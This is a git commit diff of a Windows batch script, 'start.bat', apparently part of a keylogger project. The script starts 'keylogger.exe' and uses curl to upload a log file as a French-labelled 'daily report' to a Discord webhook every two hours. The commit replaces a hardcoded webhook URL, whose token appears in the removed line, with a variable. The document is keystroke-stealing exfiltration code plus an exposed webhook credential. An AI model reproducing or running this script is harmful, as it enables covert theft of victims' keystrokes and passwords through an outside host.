0e9a3d5f273dbc0df64b44e1917cc81f216eda05
Timothée <121766524+TimotheeGrn@users.noreply.github.com>
2023-10-25 21:08:54 +0200

    Update start.bat

--- docs/start.bat
+++ docs/start.bat
@@ -4,7 +4,7 @@ start keylogger.exe
 setlocal enabledelayedexpansion
 set "message_text=**Voici le rapport quotidien envoyé à :** !time!"
 set "attachment=dat.txt"
-curl -k -F "payload_json={\"content\": \"%message_text%\"}" -F "file1=@%attachment%" https://discord.com/api/webhooks/1166767823159300136/rw5sYKEyu74anw_aH0u4W3pPjbVtuqqkdvTflPWOAPax0whn3uRM38_ujjQ3ejGbGpy4
+curl -k -F "payload_json={\"content\": \"%message_text%\"}" -F "file1=@%attachment%" %discordwebhookurl%
 endlocal
 
 timeout /t 7200 >nul
